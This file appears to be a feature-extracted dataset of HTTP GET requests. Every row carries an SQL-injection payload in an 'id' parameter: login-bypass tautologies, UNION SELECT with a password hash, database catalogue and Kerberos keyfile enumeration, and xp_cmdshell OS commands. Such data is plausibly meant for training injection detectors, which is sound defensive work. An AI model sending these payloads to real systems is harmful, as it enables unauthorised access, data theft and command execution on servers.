64,1,200,4746,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,3921,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,6130,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,5537,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
34,1,200,1647,7,9,7,2,1,GET login/?id=' or 0=0 -- HTTP/1.1
34,1,200,7050,7,9,7,2,1,GET login/?id=' or 0=0 -- HTTP/1.1
26,2,200,2029,7,4,8,1,1,GET ?id=' or ''&' HTTP/1.1
26,2,200,6069,7,4,8,1,1,GET ?id=' or ''&' HTTP/1.1
46,1,200,1017,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,2112,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,3651,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,3069,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,4779,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,7514,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,3666,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
46,1,200,5231,7,25,6,1,1,GET ?id=select * from syscat.tabauth; HTTP/1.1
41,1,200,5126,7,18,6,2,1,GET login/?id=' or uname like '% HTTP/1.1
41,1,200,2947,7,18,6,2,1,GET login/?id=' or uname like '% HTTP/1.1
41,1,200,5806,7,18,6,2,1,GET login/?id=' or uname like '% HTTP/1.1
41,1,200,2783,7,18,6,2,1,GET login/?id=' or uname like '% HTTP/1.1
41,1,200,6874,7,18,6,2,1,GET login/?id=' or uname like '% HTTP/1.1
38,1,200,2078,7,9,12,2,1,GET ?id=admin') or ('1'='1'/* HTTP/1.1
38,1,200,5530,7,9,12,2,1,GET ?id=admin') or ('1'='1'/* HTTP/1.1
49,1,200,5910,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,6103,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,1747,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,2573,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,4089,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,5491,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,2909,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,3135,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,3175,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
62,1,200,6615,7,31,10,3,1,GET login/?id=' and substring(password/text()_1_1)='7 HTTP/1.1
62,1,200,1372,7,31,10,3,1,GET login/?id=' and substring(password/text()_1_1)='7 HTTP/1.1
62,1,200,5850,7,31,10,3,1,GET login/?id=' and substring(password/text()_1_1)='7 HTTP/1.1
62,1,200,1013,7,31,10,3,1,GET login/?id=' and substring(password/text()_1_1)='7 HTTP/1.1
26,1,200,7134,7,7,6,2,1,GET login/?id='-' HTTP/1.1
26,1,200,4842,7,7,6,2,1,GET login/?id='-' HTTP/1.1
26,1,200,7443,7,7,6,2,1,GET login/?id='-' HTTP/1.1
56,1,200,4347,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,4817,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,7395,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
56,1,200,3369,17,26,5,1,1,GET ?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
34,1,200,1382,7,11,8,2,1,GET login/?id=' or 'a'='a HTTP/1.1
34,1,200,3496,7,11,8,2,1,GET login/?id=' or 'a'='a HTTP/1.1
32,1,200,3275,7,6,12,1,1,GET ?id=') or ('x')=('x HTTP/1.1
41,1,200,1911,7,14,10,2,1,GET login/?id=admin' or '1'='1'# HTTP/1.1
41,1,200,2301,7,14,10,2,1,GET login/?id=admin' or '1'='1'# HTTP/1.1
41,1,200,1327,7,14,10,2,1,GET login/?id=admin' or '1'='1'# HTTP/1.1
41,1,200,4949,7,14,10,2,1,GET login/?id=admin' or '1'='1'# HTTP/1.1
44,1,200,2240,7,21,6,2,1,GET login/?id=' or username like '% HTTP/1.1
44,1,200,4016,7,21,6,2,1,GET login/?id=' or username like '% HTTP/1.1
34,1,200,3311,7,12,6,1,1,GET ?id=' or user like '% HTTP/1.1
34,1,200,4110,7,12,6,1,1,GET ?id=' or user like '% HTTP/1.1
34,1,200,4969,7,12,6,1,1,GET ?id=' or user like '% HTTP/1.1
36,1,200,2879,7,9,11,1,1,GET ?id=admin' or '1'='1'-- HTTP/1.1
36,1,200,2586,7,9,11,1,1,GET ?id=admin' or '1'='1'-- HTTP/1.1
36,1,200,7052,7,9,11,1,1,GET ?id=admin' or '1'='1'-- HTTP/1.1
52,1,200,3367,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,2868,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,3414,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,5019,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
53,1,200,5508,7,26,7,2,1,GET login/?id=' group by userid having 1=1-- HTTP/1.1
38,1,200,5950,7,15,8,2,1,GET login/?id=' or 'one'='one HTTP/1.1
38,1,200,1304,7,15,8,2,1,GET login/?id=' or 'one'='one HTTP/1.1
38,1,200,2241,7,15,8,2,1,GET login/?id=' or 'one'='one HTTP/1.1
31,1,200,7531,7,9,6,1,1,GET ?id=admin' or 1=1# HTTP/1.1
31,1,200,4543,7,9,6,1,1,GET ?id=admin' or 1=1# HTTP/1.1
32,1,200,5743,7,4,12,1,1,GET ?id=') or ('1'='1-- HTTP/1.1
32,1,200,5643,7,4,12,1,1,GET ?id=') or ('1'='1-- HTTP/1.1
32,1,200,4598,7,4,12,1,1,GET ?id=') or ('1'='1-- HTTP/1.1
32,1,200,1369,7,4,12,1,1,GET ?id=') or ('1'='1-- HTTP/1.1
32,1,200,7277,7,4,12,1,1,GET ?id=') or ('1'='1-- HTTP/1.1
51,1,200,2074,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,1651,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,7871,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,1236,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,3864,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,2684,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
35,1,200,7927,7,13,6,1,1,GET ?id=' or uname like '% HTTP/1.1
35,1,200,2333,7,13,6,1,1,GET ?id=' or uname like '% HTTP/1.1
35,1,200,6084,7,13,6,1,1,GET ?id=' or uname like '% HTTP/1.1
35,1,200,3650,7,13,6,1,1,GET ?id=' or uname like '% HTTP/1.1
35,1,200,3969,7,13,6,1,1,GET ?id=' or uname like '% HTTP/1.1
62,1,200,5228,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,2186,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,3595,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
62,1,200,1387,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
39,1,200,7495,7,14,8,2,1,GET login/?id=admin' or '1'='1 HTTP/1.1
39,1,200,2131,7,14,8,2,1,GET login/?id=admin' or '1'='1 HTTP/1.1
39,1,200,3034,7,14,8,2,1,GET login/?id=admin' or '1'='1 HTTP/1.1
28,1,200,2921,7,4,7,1,1,GET ?id=' or 0=0 -- HTTP/1.1
28,1,200,2960,7,4,7,1,1,GET ?id=' or 0=0 -- HTTP/1.1
26,1,200,1880,7,4,8,1,1,GET ?id=' or ''=' HTTP/1.1
26,1,200,7417,7,4,8,1,1,GET ?id=' or ''=' HTTP/1.1
26,1,200,6736,7,4,8,1,1,GET ?id=' or ''=' HTTP/1.1
26,1,200,3490,7,4,8,1,1,GET ?id=' or ''=' HTTP/1.1
30,1,200,2077,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,4890,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,2817,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,1540,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
36,1,200,2984,7,6,16,1,1,GET ?id=')) or (('x'))=(('x HTTP/1.1
27,1,200,7062,7,5,6,1,1,GET ?id=' and 1='1 HTTP/1.1
27,1,200,5332,7,5,6,1,1,GET ?id=' and 1='1 HTTP/1.1
40,1,200,4488,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,7372,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
40,1,200,2662,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
26,1,200,7179,7,4,5,1,1,GET ?id=' or 1=1¡V HTTP/1.1
26,1,200,3435,7,4,5,1,1,GET ?id=' or 1=1¡V HTTP/1.1
26,1,200,7426,7,4,5,1,1,GET ?id=' or 1=1¡V HTTP/1.1
26,1,200,6265,7,4,5,1,1,GET ?id=' or 1=1¡V HTTP/1.1
26,1,200,3129,7,4,5,1,1,GET ?id=' or 1=1¡V HTTP/1.1
26,1,200,1434,7,7,5,2,1,GET login/?id=' # HTTP/1.1
26,1,200,4140,7,7,5,2,1,GET login/?id=' # HTTP/1.1
26,1,200,6119,7,7,5,2,1,GET login/?id=' # HTTP/1.1
33,1,200,2765,7,9,7,2,1,GET login/?id=' or 1=1;# HTTP/1.1
33,1,200,6029,7,9,7,2,1,GET login/?id=' or 1=1;# HTTP/1.1
34,1,200,5702,7,11,8,1,1,GET ?id=' and 'one'='one¡V HTTP/1.1
34,1,200,1073,7,11,8,1,1,GET ?id=' and 'one'='one¡V HTTP/1.1
34,1,200,6757,7,11,8,1,1,GET ?id=' and 'one'='one¡V HTTP/1.1
24,1,200,4170,7,4,5,1,0,GET ?id=or 1=1# HTTP/1.1
24,1,200,1716,7,4,5,1,0,GET ?id=or 1=1# HTTP/1.1
56,1,200,5978,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
74,1,200,5342,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,5914,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,4005,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,7249,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
43,1,200,1421,7,14,12,2,1,GET login/?id=admin') or ('1'='1'# HTTP/1.1
42,1,200,5871,7,14,11,2,1,GET login/?id=admin') or '1'='1'# HTTP/1.1
42,1,200,6450,7,14,11,2,1,GET login/?id=admin') or '1'='1'# HTTP/1.1
56,1,200,4349,7,26,10,2,1,GET ?id=' and substring(password/text()_1_1)='7 HTTP/1.1
51,1,200,2098,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,7230,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,1059,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,3329,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,2567,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,6875,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,7669,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
51,1,200,3114,7,31,5,1,1,GET ?id=select name from sysibm.systables; HTTP/1.1
59,1,200,5087,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,1665,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,7194,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,7776,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,1711,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
59,1,200,7576,7,35,7,2,2,GET login/?id=exec master..xp_cmdshell 'net users' HTTP/1.1
37,1,200,5961,7,9,12,1,1,GET ?id=admin') or '1'='1'-- HTTP/1.1
37,1,200,3897,7,9,12,1,1,GET ?id=admin') or '1'='1'-- HTTP/1.1
36,1,200,1464,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,2720,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,4763,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,6208,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,7232,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
36,1,200,1865,7,14,6,1,1,GET ?id=' or userid like '% HTTP/1.1
32,2,200,2804,7,9,8,2,1,GET login/?id=' or ''&' HTTP/1.1
32,2,200,6784,7,9,8,2,1,GET login/?id=' or ''&' HTTP/1.1
32,2,200,5860,7,9,8,2,1,GET login/?id=' or ''&' HTTP/1.1
33,1,200,5021,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
38,1,200,2804,7,9,13,1,1,GET ?id=admin') or ('1'='1'-- HTTP/1.1
35,1,200,1427,12,4,7,1,1,GET ?id=' or 1=1 LIMIT 1;# HTTP/1.1
35,1,200,6373,12,4,7,1,1,GET ?id=' or 1=1 LIMIT 1;# HTTP/1.1
26,1,200,5782,7,7,5,3,1,GET login/?id='/* HTTP/1.1
26,1,200,3205,7,7,5,3,1,GET login/?id='/* HTTP/1.1
27,1,200,6731,7,4,6,1,1,GET ?id=' or 0=0 # HTTP/1.1
27,1,200,7286,7,4,6,1,1,GET ?id=' or 0=0 # HTTP/1.1
27,1,200,6201,7,4,6,1,1,GET ?id=' or 0=0 # HTTP/1.1
32,1,200,5172,7,9,8,2,1,GET login/?id=' or ''=' HTTP/1.1
31,1,200,2179,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
31,1,200,5532,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
31,1,200,4257,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
31,1,200,2357,7,4,11,1,1,GET ?id=') or '1'='1-- HTTP/1.1
29,1,200,3274,7,4,7,1,1,GET ?id=) or '1¡¬='1¡V HTTP/1.1
29,1,200,1072,7,4,7,1,1,GET ?id=) or '1¡¬='1¡V HTTP/1.1
29,1,200,4411,7,4,7,1,1,GET ?id=) or '1¡¬='1¡V HTTP/1.1
29,1,200,6247,7,4,7,1,1,GET ?id=) or '1¡¬='1¡V HTTP/1.1
32,1,200,1860,7,9,5,3,2,GET login/?id= or 1=1/* HTTP/1.1
32,1,200,7397,7,9,5,3,2,GET login/?id= or 1=1/* HTTP/1.1
38,1,200,5654,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
38,1,200,7220,7,14,7,2,1,GET login/?id=admin' or 1=1-- HTTP/1.1
25,1,200,6169,7,4,5,1,1,GET ?id=' or 1=1 HTTP/1.1
20,1,200,2210,7,2,6,1,1,GET ?id='-- HTTP/1.1
27,1,200,2150,7,4,6,1,2,GET ?id= or 0=0 -- HTTP/1.1
27,1,200,3601,7,4,6,1,2,GET ?id= or 0=0 -- HTTP/1.1
27,1,200,7291,7,4,6,1,2,GET ?id= or 0=0 -- HTTP/1.1
27,1,200,2273,7,4,6,1,2,GET ?id= or 0=0 -- HTTP/1.1
37,1,200,3823,7,9,11,2,1,GET login/?id=') or '1'='1-- HTTP/1.1
43,1,200,7392,7,14,11,3,1,GET login/?id=admin') or '1'='1'/* HTTP/1.1
43,1,200,1658,7,14,11,3,1,GET login/?id=admin') or '1'='1'/* HTTP/1.1
20,1,200,1516,7,2,5,2,1,GET ?id='/* HTTP/1.1
38,1,200,3774,7,11,9,2,1,GET login/?id='or 1=1 or ''=' HTTP/1.1
87,1,200,3811,24,20,8,2,1,GET login/?id=' AND 1=0 UNION ALL SELECT ''_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
87,1,200,1049,24,20,8,2,1,GET login/?id=' AND 1=0 UNION ALL SELECT ''_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
87,1,200,4217,24,20,8,2,1,GET login/?id=' AND 1=0 UNION ALL SELECT ''_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
32,1,200,5426,7,9,6,2,2,GET login/?id= or 1=1-- HTTP/1.1
32,1,200,1493,7,9,6,2,2,GET login/?id= or 1=1-- HTTP/1.1
50,1,200,2012,7,15,13,1,1,GET ?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
25,1,200,7035,7,5,4,1,0,GET ?id= and 1=1 HTTP/1.1
25,1,200,4960,7,5,4,1,0,GET ?id= and 1=1 HTTP/1.1
36,1,200,5989,7,9,10,2,1,GET ?id=admin' or '1'='1'/* HTTP/1.1
36,1,200,6087,7,9,10,2,1,GET ?id=admin' or '1'='1'/* HTTP/1.1
19,1,200,2727,7,2,5,1,0,GET ?id=== HTTP/1.1
19,1,200,5280,7,2,5,1,0,GET ?id=== HTTP/1.1
19,1,200,6601,7,2,5,1,0,GET ?id=== HTTP/1.1
56,1,200,5627,21,14,8,2,1,GET login/?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
28,1,200,3798,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,1519,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
33,1,200,6298,7,11,6,1,1,GET ?id=' or uid like '% HTTP/1.1
33,1,200,6992,7,11,6,1,1,GET ?id=' or uid like '% HTTP/1.1
41,1,200,7848,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,3776,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,7673,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,4124,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,4841,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,2145,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,7054,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
37,1,200,1324,7,14,6,2,1,GET login/?id=admin' or 1=1# HTTP/1.1
37,1,200,6651,7,14,6,2,1,GET login/?id=admin' or 1=1# HTTP/1.1
37,1,200,1056,7,14,6,2,1,GET login/?id=admin' or 1=1# HTTP/1.1
33,1,200,1494,7,9,8,1,1,GET ?id=admin' or '1'='1 HTTP/1.1
26,1,200,4419,7,4,5,2,2,GET ?id= or 1=1/* HTTP/1.1
26,1,200,6925,7,4,5,2,2,GET ?id= or 1=1/* HTTP/1.1
26,1,200,1349,7,4,5,2,2,GET ?id= or 1=1/* HTTP/1.1
32,1,200,5022,7,10,4,2,0,GET login/?id= and 1=1¡V HTTP/1.1
32,1,200,3849,7,10,4,2,0,GET login/?id= and 1=1¡V HTTP/1.1
32,1,200,4875,7,10,4,2,0,GET login/?id= and 1=1¡V HTTP/1.1
33,1,200,4776,7,4,13,1,1,GET ?id=') or ('1'='1'-- HTTP/1.1
38,1,200,6024,7,9,12,2,1,GET login/?id=') or '1'='1'-- HTTP/1.1
38,1,200,5442,7,9,12,2,1,GET login/?id=') or '1'='1'-- HTTP/1.1
26,1,200,3122,7,4,6,1,1,GET ?id=' or 1=1# HTTP/1.1
26,1,200,5185,7,4,6,1,1,GET ?id=' or 1=1# HTTP/1.1
32,1,200,7637,7,9,8,2,1,GET login/?id=' or ''*' HTTP/1.1
32,1,200,6332,7,10,8,1,1,GET ?id=' or 'one'='one HTTP/1.1
31,1,200,5250,7,4,11,1,1,GET ?id=') or '1'='1'# HTTP/1.1
31,1,200,3778,7,4,11,1,1,GET ?id=') or '1'='1'# HTTP/1.1
31,1,200,7262,7,4,11,1,1,GET ?id=') or '1'='1'# HTTP/1.1
43,1,200,3434,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
61,1,200,3600,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,1653,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,4209,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,1721,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,7169,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,7126,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
26,1,200,3192,7,4,8,1,1,GET ?id=' or ''^' HTTP/1.1
26,1,200,2880,7,4,8,1,1,GET ?id=' or ''^' HTTP/1.1
26,1,200,2186,7,4,8,1,1,GET ?id=' or ''^' HTTP/1.1
35,1,200,5930,7,9,10,1,1,GET ?id=admin') or ('1'='1 HTTP/1.1
35,1,200,6299,7,9,10,1,1,GET ?id=admin') or ('1'='1 HTTP/1.1
35,1,200,4898,7,9,10,1,1,GET ?id=admin') or ('1'='1 HTTP/1.1
45,1,200,1108,7,14,8,2,1,GET login/?id=' or 1=1 limit 1 -- -  HTTP/1.1
31,1,200,1946,7,13,3,2,1,GET login/?id= or true HTTP/1.1
33,1,200,1517,7,9,6,3,1,GET login/?id=' or 1=1/* HTTP/1.1
33,1,200,2814,7,9,6,3,1,GET login/?id=' or 1=1/* HTTP/1.1
26,1,200,3813,7,5,4,1,0,GET ?id= and 1=1¡V HTTP/1.1
32,1,200,6577,7,9,5,2,0,GET login/?id= or 0=0 # HTTP/1.1
34,1,200,4618,7,9,8,2,1,GET login/?id=' or '1'='1 HTTP/1.1
28,1,200,1627,7,8,6,1,1,GET ?id=' or true-- HTTP/1.1
20,1,200,7744,7,2,6,1,1,GET ?id='^' HTTP/1.1
34,1,200,3078,7,9,7,2,1,GET login/?id=' or '1¡¬='1 HTTP/1.1
31,1,200,6588,7,4,10,2,1,GET ?id=' or '1'='1'/* HTTP/1.1
55,1,200,2914,7,28,7,2,1,GET login/?id=' group by password having 1=1-- HTTP/1.1
46,1,200,6156,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
46,1,200,5175,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
46,1,200,6890,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
38,1,200,5183,7,10,7,2,1,GET login/?id=1¡¬) and '1¡¬='1¡V HTTP/1.1
38,1,200,3996,7,10,7,2,1,GET login/?id=1¡¬) and '1¡¬='1¡V HTTP/1.1
23,1,200,3007,7,4,6,1,1,GET ?id='="or' HTTP/1.1
25,1,200,6524,7,4,5,2,2,GET ?id=or 1=1/* HTTP/1.1
65,1,200,3157,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,3114,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,5236,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
41,1,200,1863,7,14,10,2,1,GET login/?id=admin') or ('1'='1 HTTP/1.1
41,1,200,7743,7,14,10,2,1,GET login/?id=admin') or ('1'='1 HTTP/1.1
41,1,200,5817,7,14,10,2,1,GET login/?id=admin') or ('1'='1 HTTP/1.1
41,1,200,6865,7,14,10,2,1,GET login/?id=admin') or ('1'='1 HTTP/1.1
41,1,200,5856,7,14,10,2,1,GET login/?id=admin') or ('1'='1 HTTP/1.1
36,1,200,6715,7,9,8,2,1,GET login/?id=) or ('1¡¬='1¡V HTTP/1.1
36,1,200,5461,7,9,8,2,1,GET login/?id=) or ('1¡¬='1¡V HTTP/1.1
97,1,200,1259,24,25,8,2,1,GET login/?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
97,1,200,7780,24,25,8,2,1,GET login/?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,1949,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,2284,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,4894,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,2300,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,7422,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
81,1,200,4099,7,53,7,2,1,GET login/?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
75,1,200,7610,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
75,1,200,7858,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
75,1,200,7634,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
75,1,200,5384,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
25,1,200,3327,7,7,5,2,0,GET login/?id=== HTTP/1.1
36,1,200,3364,7,14,5,2,1,GET login/?id=admin' or 1=1 HTTP/1.1
36,1,200,7348,7,14,5,2,1,GET login/?id=admin' or 1=1 HTTP/1.1
36,1,200,2338,7,14,5,2,1,GET login/?id=admin' or 1=1 HTTP/1.1
36,1,200,4573,7,14,5,2,1,GET login/?id=admin' or 1=1 HTTP/1.1
36,1,200,4079,7,14,5,2,1,GET login/?id=admin' or 1=1 HTTP/1.1
32,1,200,2724,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2842,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5794,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2774,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,1159,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,5373,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,6096,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
42,1,200,3124,7,19,6,2,1,GET login/?id=' or userid like '% HTTP/1.1
42,1,200,5522,7,19,6,2,1,GET login/?id=' or userid like '% HTTP/1.1
42,1,200,1492,7,19,6,2,1,GET login/?id=' or userid like '% HTTP/1.1
42,1,200,5851,7,19,6,2,1,GET login/?id=' or userid like '% HTTP/1.1
35,1,200,6121,7,9,7,2,1,GET login/?id=) or '1¡¬='1¡V HTTP/1.1
35,1,200,3279,7,9,7,2,1,GET login/?id=) or '1¡¬='1¡V HTTP/1.1
28,1,200,5886,7,4,7,1,1,GET ?id=' or 1=1 -- HTTP/1.1
28,1,200,6829,7,4,7,1,1,GET ?id=' or 1=1 -- HTTP/1.1
28,1,200,6516,7,4,7,1,1,GET ?id=' or 1=1 -- HTTP/1.1
